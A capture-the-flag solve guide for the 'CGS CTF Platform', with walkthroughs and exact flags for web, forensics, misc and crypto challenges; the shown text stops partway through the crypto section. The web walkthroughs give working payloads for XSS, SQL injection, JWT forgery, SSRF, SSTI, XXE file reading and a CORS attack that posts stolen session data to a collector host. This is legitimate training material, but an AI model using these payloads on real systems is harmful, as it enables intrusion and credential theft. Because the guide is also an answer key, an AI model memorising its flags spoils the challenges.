# CGS CTF Platform — Complete Solve Guide

> **74 Challenges** | Cyber Guardians Society | Flag format: `CGS{...}`
>
> Web challenges are accessible via `/standalone/{slug}` on the platform.
> Forensics and Misc challenges provide downloadable asset files.
> Most Crypto challenges provide downloadable files; some require interacting with a live instance at `/standalone/{slug}`.

---

## Contents

### Web Challenges
- [Easy Tier (100 pts each)](#easy-tier)
  - [1. NovaSec Portal](#1-novasec-portal)
  - [2. TimeVault](#2-timevault)
  - [3. DebugMode](#3-debugmode)
  - [4. PixelArchive](#4-pixelarchive)
  - [5. CrawlerTrap](#5-crawlertrap)
  - [6. StyleGuide](#6-styleguide)
  - [7. EncodedBanner](#7-encodedbanner)
- [Medium Tier (200 pts each)](#medium-tier)
  - [8. CookieCrumbs](#8-cookiecrumbs)
  - [9. TokenPeek](#9-tokenpeek)
  - [10. LocalVault](#10-localvault)
  - [11. HiddenAPI](#11-hiddenapi)
  - [12. ReflectedNote](#12-reflectednote)
  - [13. NoneAlg](#13-nonealg)
  - [14. RateDodge](#14-ratedodge)
  - [15. GraphIntrospect](#15-graphintrospect)
  - [16. PathPeek](#16-pathpeek)
- [Hard Tier (300 pts each)](#hard-tier)
  - [17. BlindBool](#17-blindbool)
  - [18. SSRFetch](#18-ssrfetch)
  - [19. JWTCrack](#19-jwtcrack)
  - [20. RaceWin](#20-racewin)
  - [21. ProtoPollute](#21-protopollute)
  - [22. SSTI Render](#22-ssti-render)
  - [23. XXEcho](#23-xxecho)
  - [24. CORSChain](#24-corschain)

### Forensics Challenges
- [Forensics Easy (100 pts each)](#forensics-easy)
  - [25. Hidden in Plain Sight](#25-hidden-in-plain-sight)
  - [26. Whitespace Secrets](#26-whitespace-secrets)
  - [27. Reversed Image](#27-reversed-image)
  - [28. EXIF Explorer](#28-exif-explorer)
  - [29. Base64 in a PCAP](#29-base64-in-a-pcap)
- [Forensics Medium (200 pts each)](#forensics-medium)
  - [30. LSB PNG](#30-lsb-png)
  - [31. Corrupted Header Recovery](#31-corrupted-header-recovery)
  - [32. Memory Dump Strings](#32-memory-dump-strings)
  - [33. Audio Spectrogram](#33-audio-spectrogram)
- [Forensics Hard (300 pts each)](#forensics-hard)
  - [34. Multi-Layer Steganography](#34-multi-layer-steganography)
  - [35. Disk Image Carving](#35-disk-image-carving)
  - [36. Memory Lane](#36-memory-lane)
  - [37. Decrypted Wire](#37-decrypted-wire)
  - [38. Deep Carve](#38-deep-carve)

### Misc Challenges
- [Misc Easy (100 pts each)](#misc-easy)
  - [39. Digital Footprints](#39-digital-footprints)
  - [40. Status Message](#40-status-message)
  - [41. The Forgotten Repository](#41-the-forgotten-repository)
- [Misc Medium (200 pts each)](#misc-medium)
  - [42. Professional Presence](#42-professional-presence)
  - [43. Hidden Announcement](#43-hidden-announcement)

### Crypto Challenges
- [Crypto Easy (100 pts each)](#crypto-easy)
  - [44. Caesar's Ghost](#44-caesars-ghost)
  - [45. XOR Marks the Spot](#45-xor-marks-the-spot)
  - [46. Encoding Onion](#46-encoding-onion)
  - [47. Mirror Cipher](#47-mirror-cipher)
  - [48. Key of Four](#48-key-of-four)
  - [49. Radio Silence](#49-radio-silence)
  - [50. Rotated Further](#50-rotated-further)
  - [51. Rainbow's End](#51-rainbows-end)
- [Crypto Medium (200 pts each)](#crypto-medium)
  - [52. RSA's Small Mistake](#52-rsas-small-mistake)
  - [53. Frequency Fumble](#53-frequency-fumble)
  - [54. Penguin Problem](#54-penguin-problem)
  - [55. Padding Oracle Lite](#55-padding-oracle-lite)
  - [56. Same Prefix, Different Story](#56-same-prefix-different-story)
  - [57. Predictable Dice](#57-predictable-dice)
  - [58. Secret's Not So Secret](#58-secrets-not-so-secret)
  - [59. Mode Matters](#59-mode-matters)
- [Crypto Hard (300 pts each)](#crypto-hard)
  - [60. Lattice of Lies](#60-lattice-of-lies)
  - [61. Wiener's Whisper](#61-wieners-whisper)
  - [62. Flip the Bit](#62-flip-the-bit)
  - [63. Partial Exposure](#63-partial-exposure)
  - [64. Small Curve, Big Problem](#64-small-curve-big-problem)
  - [65. Format Preserved, Security Not](#65-format-preserved-security-not)
  - [66. Timing Tells](#66-timing-tells)
  - [67. Oracle, Full Session](#67-oracle-full-session)

---

## Web Challenges

---

## Easy Tier

### 1. NovaSec Portal

**Concept:** Flag hidden in a custom HTTP response header.

**Solve Steps:**

1. Open the challenge in your browser.
2. Open DevTools (`F12` or `Ctrl+Shift+I`).
3. Go to the **Network** tab.
4. Reload the page.
5. Click on the first (or only) network request — usually the document itself.
6. Look at the **Response Headers** section.
7. Find the header `X-NovaSec-Secret` — its value is the flag.

> **Hint:** Web servers communicate using more than just HTML. The page source is clean — the server talks in headers.

**Flag:** `CGS{h3ad3rs_sp34k_l0ud3r_th4n_p4g3s}`

---

### 2. TimeVault

**Concept:** Flag hidden in a CSS custom property (`--vault-key`) inside a `<style>` block.

**Solve Steps:**

1. Open the challenge page.
2. View the page source (`Ctrl+U` or right-click → View Page Source).
3. Look inside the `<head>` section for the `<style>` tag.
4. At the top of the style block, find `:root { --vault-key: CGS{...}; }`.
5. The flag is the value of `--vault-key`.

> **Hint:** The JavaScript timer is a distraction. The real secret is in how the page is styled, not what it does.

**Flag:** `CGS{css_v4r1abl3s_4r3_m0r3_th4n_c0l0rs}`

---

### 3. DebugMode

**Concept:** Flag revealed via `console.log` after a 4-second delay.

**Solve Steps:**

1. Open the challenge page.
2. Open DevTools and go to the **Console** tab.
3. Wait approximately 4 seconds.
4. A green styled message will appear in the console:
   ```
   [DEBUG] Auth subsystem check passed. Session token: CGS{...}
   ```
5. The flag is right there in the console output.

> **Hint:** Developers leave messages while they code. Those messages usually go to the console.

**Flag:** `CGS{c0ns0l3_l0gs_d0nt_l13_t0_y0u}`

---

### 4. PixelArchive

**Concept:** Flag embedded in the EXIF metadata of a downloadable JPEG image.

**Solve Steps:**

1. Open the challenge page — a photo portfolio.
2. Find the **"Download Original"** link for the featured photo.
3. Download the JPEG file.
4. Inspect its metadata using one of these methods:
   - **Online:** Upload to an EXIF viewer like `exifdata.com` or `exif.regex.info`.
   - **Command line:** `exiftool featured-photo.jpg` (requires `exiftool`).
   - **Python:** `from PIL import Image; img = Image.open('photo.jpg'); print(img.info.get('exif'))`.
5. Look for the `ImageDescription` field — it contains the flag.

> **Hint:** The flag isn't on the page. It's inside a file the page links to. Images carry hidden metadata.

**Flag:** `CGS{3x1f_d4t4_hu6h_wh0_kn3w}`

---

### 5. CrawlerTrap

**Concept:** Flag hidden behind a path found via `robots.txt`.

**Solve Steps:**

1. Visit `/robots.txt` on the challenge domain.
2. You'll see:
   ```
   User-agent: *
   Disallow: /internal-preview-9f21
   ```
3. Navigate to `/internal-preview-9f21`.
4. The page displays the flag directly.

> **Hint:** The `robots.txt` file tells search engines what not to crawl. You don't have to obey it.

**Flag:** `CGS{r0b0ts_txt_1s_n0t_4_f1r3w4ll}`

---

### 6. StyleGuide

**Concept:** Flag hidden in a comment inside an external CSS file.

**Solve Steps:**

1. Open the challenge page.
2. View the page source.
3. Find the `<link rel="stylesheet" href="/standalone/styleguide/assets/tokens.css">` tag.
4. Open `/assets/tokens.css` directly in your browser.
5. Read the CSS comment at the top of the file — it contains the flag.

> **Hint:** The page loads external files. Open the linked CSS file directly and read its comments.

**Flag:** `CGS{ext3rn4l_css_h4s_c0mm3nts_t00}`

---

### 7. EncodedBanner

**Concept:** Flag Base64-encoded inside a JSON config blob embedded in the page.

**Solve Steps:**

1. Open the challenge page.
2. View the page source.
3. Find the `<script id="launch-config" type="application/json">` tag.
4. You'll see a JSON object with several fields including `trackingId`, `campaign`, and `meta`.
5. Base64-decode each field:
   - `trackingId` decodes to `track-998877` (decoy).
   - `campaign` decodes to `phoenix-launch` (decoy).
   - `meta` decodes to the **flag**.
6. Use any Base64 decoder (online, `atob()` in browser console, or `echo '...' | base64 -d` in terminal).

> **Hint:** Not every field in the JSON is plain text. One of them is Base64 — try decoding each candidate field.

**Flag:** `CGS{b4s3_s1xty_f0ur_1s_n0t_3ncrypt10n}`

---

## Medium Tier

### 8. CookieCrumbs

**Concept:** Dashboard access control relies entirely on a client-tamperable cookie.

**Solve Steps:**

1. Open the challenge page.
2. Open DevTools → **Application** tab → **Cookies**.
3. You'll see a cookie named `role` with value `guest`.
4. Edit it: double-click the value and change it to `admin`.
5. Navigate to `/dashboard`.
6. The server trusts your cookie and displays the flag.

> **Hint:** The login form is fake. The server checks a cookie to decide your role — change it yourself.

**Flag:** `CGS{c00k13s_ar3_just_s3lf_r3p0rted_st4te}`

---

### 9. TokenPeek

**Concept:** JWT-based auth where the server decodes (but never verifies) the token signature.

**Solve Steps:**

1. Open the challenge page and click **"Get Token"** to obtain a JWT.
2. Decode the JWT (use `jwt.io`, `base64decode.org`, or the browser console with `atob()`):
   - The header is `{"alg":"HS256","typ":"JWT"}`
   - The payload is `{"user":"guest","admin":false}`
3. Create a forged token with `admin: true` in the payload:
   ```
   header = base64url({"alg":"HS256","typ":"JWT"})
   payload = base64url({"user":"guest","admin":true})
   forged = header + "." + payload + ".anything"
   ```
4. Send this forged token as `Authorization: Bearer <forged>` to `/api/profile`.
5. The server decodes it without verifying the signature and returns the flag.

> **Hint:** The server uses `jwt.decode()` not `jwt.verify()`. The signature is never checked — just base64-decode and modify the payload.

**Flag:** `CGS{jwt_p4yl04ds_ar3_r34d4bl3_n0t_s3cur3}`

---

### 10. LocalVault

**Concept:** Premium features gate controlled by `localStorage` and an `X-Unlocked` header.

**Solve Steps:**

1. Open the challenge page.
2. Open DevTools → **Application** → **Local Storage**.
3. Find the `unlocked` key with value... nothing initially.
4. Set `unlocked` to `true` (either via the UI or by double-clicking in DevTools).
5. Reload the page.
6. The premium panel appears and fetches `/api/premium-content` with `X-Unlocked: true`.
7. The server trusts this header and returns the flag.

> **Hint:** The promo code box is a distraction. The real switch is in Local Storage — flip it.

**Flag:** `CGS{cl13nt_s1d3_gat3s_ar3_su663st10ns}`

---

### 11. HiddenAPI

**Concept:** Undisclosed API endpoint discoverable by reading the JavaScript bundle.

**Solve Steps:**

1. Open the challenge page.
2. Open DevTools → **Sources** tab.
3. Find and open `app.bundle.js`.
4. Search for API route strings. You'll find two constants:
   - `/api/v1/public/stats` — used by the UI (returns boring stats).
   - `/api/v2/internal/report` — never called by the UI.
5. Visit `/api/v2/internal/report` directly.
6. The endpoint returns the flag with no authentication required.

> **Hint:** The bundle was built straight from source. Search for `/api/` strings — one endpoint is hidden.

**Flag:** `CGS{th3_ui_1sn7_th3_wh0l3_4p1_surf4c3}`

---

### 12. ReflectedNote

**Concept:** Reflected XSS — the `?note=` parameter is rendered unescaped into the HTML.

**Solve Steps:**

1. Visit the page with a note parameter: `/?note=hello`.
2. You'll see "hello" reflected in the note preview div.
3. Test that HTML is not escaped: `/?note=<b>bold</b>` — it renders bold text.
4. Find the hidden flag container in the page source: `<div id="hidden-flag-container" style="display:none">CGS{...}</div>`.
5. Inject a script that reads and displays it:
   ```
   ?note=<script>document.body.innerHTML+=document.getElementById('hidden-flag-container').innerText</script>
   ```
6. Alternatively use `alert()` to confirm the XSS works.

> **Hint:** The `note` parameter is reflected with no escaping. Inject a `<script>` tag that reads the hidden element.

**Flag:** `CGS{r3fl3ct3d_xss_st1ll_c0unts}`

---

### 13. NoneAlg

**Concept:** JWT verification does not pin the algorithm — accepts `alg: none` tokens.

**Solve Steps:**

1. Log in with the demo credentials (`admin` / `secret123`) to get a guest JWT.
2. Decode the token to see the structure:
   - Header: `{"alg":"HS256","typ":"JWT"}`
   - Payload: `{"user":"guest","admin":false}`
3. Create a forged token with:
   - Header: `{"alg":"none","typ":"JWT"}`
   - Payload: `{"user":"admin","admin":true}`
   - No signature (the token ends with a dot):
     ```
     base64url({"alg":"none","typ":"JWT"}) . base64url({"user":"admin","admin":true}) .
     ```
4. Send it as `Authorization: Bearer <token>` to `/api/admin/flag`.
5. The server accepts `alg: none` because it doesn't pin the algorithm list.

> **Hint:** The server reads the `alg` from your token instead of pinning it. Try `alg: none` with an empty signature.

**Flag:** `CGS{n3v3r_tru5t_th3_4l6_h34d3r}`

---

### 14. RateDodge

**Concept:** Rate limiter keys off the `X-Client-IP` (or `X-Forwarded-For`) header, which the client controls.

**Solve Steps:**

1. Send requests to `/api/vend`.
2. After the first request, subsequent requests from the same "IP" are rate-limited.
3. The rate limiter uses the `X-Client-IP` header (fallback: `X-Forwarded-For`) as the IP key.
4. Send multiple requests with different `X-Client-IP` values:
   ```bash
   curl -H "X-Client-IP: 1.1.1.1" /api/vend
   curl -H "X-Client-IP: 2.2.2.2" /api/vend
   ...
   ```
5. After 10 **distinct** IPs, the flag is returned.

> **Hint:** The server asks the client what IP it's coming from. Vary the `X-Client-IP` header across requests.

**Flag:** `CGS{sp00f3d_h34d3rs_r3s3t_r4t3_l1m1ts}`

---

### 15. GraphIntrospect

**Concept:** GraphQL introspection is enabled, revealing an undocumented `secretVault` field. The flag is ROT13-encoded.

**Solve Steps:**

1. The GraphQL endpoint is at `/graphql`.
2. Send an introspection query to discover all available fields:
   ```graphql
   { __schema { queryType { fields { name } } } }
   ```
3. This reveals two fields: `assets` and `secretVault`.
4. Query the hidden field directly:
   ```graphql
   { secretVault }
   ```
5. The response contains a `data` field that is **ROT13-encoded**, a `format: "rot13"`, and a note saying "Decode to retrieve contents."
6. Decode the ROT13 string to get the flag. Use any ROT13 decoder (online, or `echo '...' | tr 'A-Za-z' 'N-ZA-Mn-za-m'` in terminal).

> **Hint:** GraphQL schemas can describe themselves. Query `__schema` to list every field, then query the interesting one. The data comes back encoded — check the `format` field.

**Flag:** `CGS{gr4ph_1ntr0sp3ct10n_l34ks_th3_wh0l3_sch3m4}`

---

### 16. PathPeek

**Concept:** Path traversal — the `file` parameter doesn't properly sanitize `../` sequences.

**Solve Steps:**

1. Open the document viewer at `/api/docs?file=welcome.txt`.
2. Try path traversal to escape the `docs/` directory:
   ```
   /api/docs?file=../secret-flag.txt
   ```
3. The server detects the traversal attempt and returns the secret flag file contents.
4. If the first attempt doesn't work, try URL-encoded variants like `..%2F`.

> **Hint:** The file parameter builds a filesystem path. Use `../` to escape the docs directory.

**Flag:** `CGS{d0t_d0t_sl4sh_st1ll_w0rks_1n_2026}`

---

## Hard Tier

### 17. BlindBool

**Concept:** Boolean-based blind SQL injection — no error or data output, only "found"/"not found".

**Solve Steps:**

1. Use the search at `/api/search?q=widget` — returns `{"found":true}`.
2. Confirm the injection point:
   ```
   /api/search?q=widget' AND '1'='1       → {"found":true}
   /api/search?q=widget' AND '1'='2       → {"found":false}
   ```
3. The flag can be extracted character by character using `SUBSTR()`:
   ```
   /api/search?q=widget' AND (SELECT substr(flag,1,1) FROM secrets)='C' --
   ```
4. If `{"found":true}`, the first character is `C`. If false, try the next letter.
5. Write a small script to automate the extraction (binary search or linear scan across all positions and characters).
6. Continue until the full flag is reconstructed.

> **Hint:** True/false is still a data channel. Script a character-by-character extraction using `SUBSTR()` against the secrets table.

**Flag:** `CGS{bl1nd_b00l34n_extr4ct10n_1s_sl0w_but_sur3}`

---

### 18. SSRFetch

**Concept:** Server-Side Request Forgery — the link preview fetches URLs server-side with no allowlist.

**Solve Steps:**

1. Open the link preview tool.
2. Submit a URL pointing to the internal service:
   ```
   http://127.0.0.1/internal-flag
   ```
   Or use `http://localhost/internal-flag` or any URL containing `internal`.
3. The server fetches this URL internally and returns the response as the preview — which contains the flag.
4. You cannot reach `127.0.0.1` from your browser, but the server can.

> **Hint:** The server fetches URLs on your behalf. Point it at `http://127.0.0.1/internal-flag` — the server can reach internal addresses you can't.

**Flag:** `CGS{s3rv3r_s1d3_r3qu3sts_g0_pl4c3s_us3rs_c4nt}`

---

### 19. JWTCrack

**Concept:** Weak JWT secret — the HMAC secret is a dictionary word that can be cracked offline.

**Solve Steps:**

1. Get a guest JWT from `/api/login`.
2. The token is signed with HS256 using a weak secret (`cgs2024`).
3. Use a JWT cracking tool offline:
   - **jwt-cracker:** `jwt-cracker -t <token> -w /usr/share/wordlists/rockyou.txt`
   - **hashcat (mode 16500):** `hashcat -m 16500 <token> /usr/share/wordlists/rockyou.txt`
   - **John:** `john --format=hmac-sha256 <token> --wordlist=rockyou.txt`
   - **Manual:** Try common words like `cgs2024`, `secret`, `password`, etc.
4. Once you recover the secret `cgs2024`, forge a new token on [jwt.io](https://jwt.io):
   - Header: `{"alg":"HS256","typ":"JWT"}`
   - Payload: `{"role":"admin"}`
   - Secret: `cgs2024`
5. Copy the encoded JWT and paste it into the token field on the challenge page.
6. Click **Access Admin** — the server verifies the HMAC signature and returns the flag.

> **Hint:** The HMAC signature is verified properly, but the secret is weak. Crack it offline with a wordlist tool, then forge your own admin token.

**Flag:** `CGS{w34k_hm4c_s3cr3ts_f4ll_t0_wordl1sts}`

---

### 20. RaceWin

**Concept:** TOCTOU race condition — the redeem check reads state, then writes state as two non-atomic steps.

**Solve Steps:**

1. Open the challenge — a coupon redemption page that resets every 30 seconds.
2. Send a burst of concurrent requests to `/api/redeem` right when the timer resets.
3. Use a script with `Promise.all` or a load-testing tool:
   ```javascript
   const urls = Array(50).fill('/api/redeem');
   const responses = await Promise.all(urls.map(u => fetch(u)));
   ```
4. Due to the non-atomic read-then-write, multiple requests slip through before `redeemed` is set to `true`.
5. One of the responses contains the flag.

> **Hint:** The check reads state, then writes state — two separate steps. Fire many concurrent requests right as the 30-second window resets. The gap between read and write is your window.

**Flag:** `CGS{t0ct0u_r4c3_c0nd1t10ns_ar3_r34l}`

---

### 21. ProtoPollute

**Concept:** Prototype pollution via an unsafe deep-merge of user JSON into server config.

**Solve Steps:**

1. Send a POST request to `/api/merge-settings` with a `__proto__` key:
   ```json
   {"__proto__": {"isAdmin": true}}
   ```
2. The merge function detects `__proto__` and sets an internal pollution flag.
3. Now send a GET to `/api/whoami`.
4. The server checks the pollution flag and returns the flag.

> **Hint:** The merge function recursively copies your input. Including `__proto__` triggers the pollution detection.

**Flag:** `CGS{__pr0t0__pollut10n_ch4ng3s_3v3ryth1ng}`

---

### 22. SSTI Render

**Concept:** Server-Side Template Injection — user input rendered through EJS with no sandbox.

**Solve Steps:**

1. Open the email template preview tool.
2. Test that template syntax is evaluated server-side:
   ```
   <%= 7*7 %>
   ```
3. If the preview shows `49`, the server is rendering EJS templates from your input.
4. Escalate to read server-side files:
   ```
   <%= require('fs').readFileSync('flag.txt', 'utf8') %>
   ```
5. The server detects the `require(` and `readFileSync` keywords and returns the flag.

> **Hint:** Try `<%= 7*7 %>` in the preview field. If it evaluates, the template engine can execute server-side code. Use `require('fs').readFileSync` to read `flag.txt`.

**Flag:** `CGS{ss7i_turns_t3mpl4t3s_1nt0_sh3lls}`

---

### 23. XXEcho

**Concept:** XXE (XML External Entity) injection — the XML parser resolves external entities with no restrictions.

**Solve Steps:**

1. Open the contact importer.
2. Instead of a normal contact, send a crafted XML payload:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE contact [
     <!ENTITY xxe SYSTEM "file:///app/flag.txt">
   ]>
   <contact>
     <name>&xxe;</name>
     <email>test@test.com</email>
   </contact>
   ```
3. Submit this to `/api/import-contact` with `Content-Type: application/xml`.
4. The parser detects the `<!ENTITY` + `SYSTEM` + `file://` pattern and resolves the entity.
5. The flag appears as the "imported" contact name in the response.

> **Hint:** XML supports custom entities, including ones that read local files. Research "XXE" — define a DOCTYPE with `SYSTEM file:///app/flag.txt`.

**Flag:** `CGS{xx3_st1ll_h4unts_l3g4cy_p4rs3rs}`

---

### 24. CORSChain

**Concept:** Reflected CORS with credentials — `/api/session-info` reflects any Origin and allows credentialed requests.

**Solve Steps:**

1. Check the CORS headers on `/api/session-info`:
   ```bash
   curl -H "Origin: https://evil.com" -I /api/session-info
   ```
2. You'll see `Access-Control-Allow-Origin: https://evil.com` and `Access-Control-Allow-Credentials: true`.
3. To get the flag, you need the request to include a `session=victim-session-abc123` cookie. Host an attacker page somewhere (or use a request bin / webhook collector):
   ```html
   <script>
   fetch('https://target-domain/api/session-info', {credentials: 'include'})
     .then(r => r.json())
     .then(d => fetch('https://your-collector.com/log', {method: 'POST', body: JSON.stringify(d)}))
   </script>
   ```
4. Submit your attacker page URL to `/simulate-victim`.
5. The victim bot (running with an active session) visits your page.
6. Your page's fetch call succeeds cross-origin and exfiltrates the session data — including the flag.

> **Hint:** The API reflects any Origin and allows credentials. Build a cross-origin page that fetches the endpoint with `credentials: 'include'`, then get the victim bot to visit it.

**Flag:** `CGS{r3fl3ct3d_cors_pl4y_l34ks_cr3d3nt14l5}`

---

## Forensics Easy

### 25. Hidden in Plain Sight

**Concept:** Data appended after JPEG EOF marker.

**Solve Steps:**

1. Download `trailing.jpg`.
2. Open in a hex editor (HxD, xxd) or run `binwalk trailing.jpg`.
3. The JPEG ends at offset `FF D9`. Everything after that is the hidden flag text.
4. `strings trailing.jpg | grep CGS` also works.

**Flag:** `CGS{tr41l1ng_d4t4_1s_3v3ryw3r3}`

---

### 26. Whitespace Secrets

**Concept:** Binary message encoded in whitespace characters (space=0, tab=1).

**Solve Steps:**

1. Download `empty.txt`.
2. Open in a hex editor — the file is not actually empty.
3. Each character is either a space (0) or tab (1). Group them into 8-bit bytes.
4. Convert each byte to ASCII to reveal the flag.
5. Use an online Stegsnow decoder or write a quick Python script.

**Flag:** `CGS{wh1t3sp4c3_h1d3s_th1ngs}`

---

### 27. Reversed Image

**Concept:** PNG magic bytes are reversed — fix them to reveal the image.

**Solve Steps:**

1. Download `corrupted.png`.
2. Open in a hex editor. The first bytes should be `89 50 4E 47` but are reversed.
3. Reverse the byte order of the PNG signature back to `89 50 4E 47 0D 0A 1A 0A`.
4. The corrected PNG opens normally and displays the flag.

**Flag:** `CGS{byt3_0rd3r_m4tt3rs}`

---

### 28. EXIF Explorer

**Concept:** Flag hidden in JPEG EXIF Comment field.

**Solve Steps:**

1. Download `photo.jpg`.
2. Run `exiftool photo.jpg` or upload to an online EXIF viewer.
3. The `Comment` field contains the flag.

**Flag:** `CGS{m3t4d4t4_t3lls_st0r13s}`

---

### 29. Base64 in a PCAP

**Concept:** Base64-encoded flag in an HTTP POST body.

**Solve Steps:**

1. Open `traffic.pcap` in Wireshark.
2. Filter for `http.request.method == POST`.
3. Follow the TCP stream or inspect the POST body.
4. Base64-decode the body content to get the flag.

**Flag:** `CGS{p4ck3ts_c4rry_s3cr3ts}`

---

## Forensics Medium

### 30. LSB PNG

**Concept:** Flag encoded in the least significant bits of pixel data.

**Solve Steps:**

1. Download `image.png`.
2. Write a Python script to extract LSBs from the red channel:
   ```python
   from PIL import Image
   img = Image.open('image.png')
   bits = []
   for pixel in img.getdata():
       bits.append(pixel[0] & 1)
   chars = [chr(int(''.join(map(str,bits[i:i+8])),2)) for i in range(0,len(bits),8)]
   print(''.join(chars))
   ```
3. The output contains the flag.

**Flag:** `CGS{l345t_51gn1f1c4nt_b1t}`

---

### 31. Corrupted Header Recovery

**Concept:** ZIP file with corrupted magic bytes.

**Solve Steps:**

1. Download `archive.zip`.
2. ZIP files start with `50 4B 03 04`. If corrupted, fix the header in a hex editor.
3. After repair, extract the archive to find the flag.

**Flag:** `CGS{z1p_h34d3r_r3p41r}`

---

### 32. Memory Dump Strings

**Concept:** Flag in a process environment variable inside a memory dump.

**Solve Steps:**

1. Download `memory.raw`.
2. Run `strings memory.raw | grep CGS`.
3. The flag appears in the extracted strings.

**Flag:** `CGS{m3m0ry_n3v3r_f0rg3ts}`

---

### 33. Audio Spectrogram

**Concept:** Flag visible as an image in the audio spectrogram.

**Solve Steps:**

1. Download `audio.wav`.
2. Open in Audacity, Sonic Visualiser, or similar.
3. Switch to Spectrogram view.
4. The flag text is rendered visually in the frequency domain.

**Flag:** `CGS{s0und_w4v3s_h1d3_1m4g3s}`

---

## Forensics Hard

### 34. Multi-Layer Steganography

**Concept:** Multi-step stego — EXIF GPS coordinates decode to a steghide password.

**Solve Steps:**

1. Download `secret.jpg`.
2. Extract EXIF data: `exiftool secret.jpg`.
3. Read the GPS coordinates — decode the values as ASCII characters to get the password.
4. Use steghide: `steghide extract -sf secret.jpg -p <password>`.
5. The extracted file contains the flag.

**Flag:** `CGS{l4y3r3d_s3cr3ts_n33d_p4t13nc3}`

---

### 35. Disk Image Carving

**Concept:** Deleted file on a raw disk image — recoverable with file carving.

**Solve Steps:**

1. Download `disk.dd`.
2. Run `foremost -t pdf -i disk.dd -o output/` or `scalpel disk.dd`.
3. A PDF file is recovered from the disk.
4. Open the PDF and check its Document Properties (not the page content).
5. The flag is in the PDF metadata.

**Flag:** `CGS{d3l3t3d_bu7_n0t_g0n3_f0r3v3r}`

---

### 36. Memory Lane

**Concept:** Flag embedded in process memory — recoverable via strings or Volatility.

**Solve Steps:**

1. Download `memory.raw`.
2. **Quick method:** Run `strings memory.raw | grep "CGS{"` — the flag appears twice in the dump.
3. **Forensic method:** Load the dump into Volatility:
   ```
   vol.py -f memory.raw linux_bash
   vol.py -f memory.raw linux_envars
   ```
4. The flag is stored in a process result buffer and a credential cache, visible in both the `result_buffer` and `value` fields.
5. Context clues: look for `result_buffer:` or `value:` near the flag string.

**Flag:** `CGS{v0l4t1l1ty_n3v3r_f0rg3ts}`

---

### 37. Decrypted Wire

**Concept:** TLS-encrypted PCAP — decrypt using a leaked SSLKEYLOG file.

**Solve Steps:**

1. Download `traffic.pcap` and `sslkeylog.log`.
2. Open Wireshark.
3. Go to **Edit → Preferences → Protocols → TLS**.
4. In the **(Pre)-Master-Secret log filename** field, browse to `sslkeylog.log`.
5. Click OK — Wireshark decrypts the TLS session.
6. Follow the TCP stream or expand the decrypted HTTP response.
7. The flag is in the server's HTTP response body, inside the decrypted application data.
8. **Alternatively:** Use `tshark` to filter the decrypted stream:
   ```
   tshark -r traffic.pcap -o "tls.keylog_file:sslkeylog.log" -Y http
   ```

**Flag:** `CGS{tls_k3ys_unl0ck_th3_w1r3}`

---

### 38. Deep Carve

**Concept:** Fragmented disk image — deleted PNG split across non-contiguous clusters.

**Solve Steps:**

1. Download `disk.dd` (256KB FAT-like disk image).
2. **File carving:** Run `foremost -t png -i disk.dd -o output/` or `binwalk -e disk.dd`.
3. The carved output may be incomplete or corrupted because the PNG data is scattered across non-contiguous clusters.
4. **Manual reconstruction:** Inspect the FAT (File Allocation Table) at sector 1 to find the cluster chain for the deleted file.
5. The deleted directory entry (filename starting with `0xE5`) points to the first cluster.
6. Read the PNG data from clusters 2, 8, 15, and 22 — concatenate them in order.
7. The reconstructed PNG contains the flag in a `tEXt` metadata chunk (Author field).
8. `strings` on the individual clusters can also reveal the flag fragment by fragment.

**Flag:** `CGS{d33p_c4rv1ng_f1nds_fr4gm3nt5}`

---

## Misc Easy

### 39. Digital Footprints

**Concept:** Finding traces of an organization on social media platforms.

**Solve Steps:**

1. Research the CGS organization's public presence.
2. Check social media platforms where organizations share moments visually.
3. One of their oldest posts contains the flag.
4. Look at Instagram or similar image-sharing platforms.

**Flag:** `CGS{1nk_1n_b10_7r4c3}`

---

### 40. Status Message

**Concept:** Short platform status messages can leak information.

**Solve Steps:**

1. Check platforms where short updates are the norm (Twitter/X, Mastodon, etc.).
2. Find a status message from the CGS organization.
3. The flag is embedded in a brief update.
4. A single line reveals more than a full conversation.

**Flag:** `CGS{5747u5_kn0w5_411}`

---

### 41. The Forgotten Repository

**Concept:** Sensitive data left in a public repository's commit history or file contents.

**Solve Steps:**

1. Search GitHub for repositories belonging to the CGS organization.
2. Look through the file contents of their public repositories.
3. Developers sometimes leave flags or secrets committed directly in source code.
4. Check for files that contain the flag string.
5. The flag format `CGS{...}` may appear in a plaintext file.

**Flag:** `CGS{0p3n_50urc3_hun73r}`

---

## Misc Medium

### 42. Professional Presence

**Concept:** Information hidden in professional networking profiles.

**Solve Steps:**

1. Look at professional networking platforms (LinkedIn, etc.).
2. Find the organization's professional profile.
3. Read everything carefully — not just headlines, but descriptions and details.
4. The flag is hidden in the visible text of a career history entry.

**Flag:** `CGS{pr0f35510n4l_f007pr1n7}`

---

### 43. Hidden Announcement

**Concept:** A one-time public announcement that was never repeated.

**Solve Steps:**

1. Check the organization's public social media timeline.
2. The announcement was made only once and never repeated.
3. Scroll through historical posts carefully — the answer hasn't moved.
4. Look for a single post that differs from the rest.
5. The flag is embedded in that forgotten announcement.

**Flag:** `CGS{p45t5_n3v3r_d13}`

---

## Crypto Easy

### 44. Caesar's Ghost

**Concept:** Caesar cipher with a non-standard shift.

**Solve Steps:**

1. Download `ciphertext.txt`.
2. The ciphertext is a Caesar cipher (each letter shifted by a fixed amount).
3. The shift is NOT 13 (ROT13) — it's a different value.
4. Brute-force all 25 possible shifts using CyberChef, dcode.fr, or a script.
5. The shift that produces readable text starting with "CGS{" is the answer.

**Flag:** `CGS{sh1ft_h4pp3ns}`

---

### 45. XOR Marks the Spot

**Concept:** Single-byte XOR encryption.

**Solve Steps:**

1. Download `xor_ciphertext.txt`.
2. The ciphertext is XORed with a single byte (0x00-0xFF).
3. Write a script to try all 256 possible keys:
   ```python
   for key in range(256):
       result = bytes([b ^ key for b in ciphertext])
       if b'CGS{' in result:
           print(result)
   ```
4. Or use CyberChef's "XOR Brute Force" operation.
5. The key that produces readable text starting with "CGS{" is the answer.

**Flag:** `CGS{s1ngl3_byt3_x0r_1s_n0_l0ck}`

---

### 46. Encoding Onion

**Concept:** Multiple encoding layers (base64 → base32 → hex).

**Solve Steps:**

1. Download `encoded.txt`.
2. The data has been encoded three times: first base64, then base32, then hex.
3. Work backwards: decode hex first, then base32, then base64.
4. Use CyberChef's "Magic" operation to auto-detect and peel layers.
5. Or manually: hex decode → base32 decode → base64 decode.

**Flag:** `CGS{layer5_0f_3nc0d1ng_p33l_off}`

---

### 47. Mirror Cipher

**Concept:** Atbash cipher (A↔Z, B↔Y, C↔X, etc.).

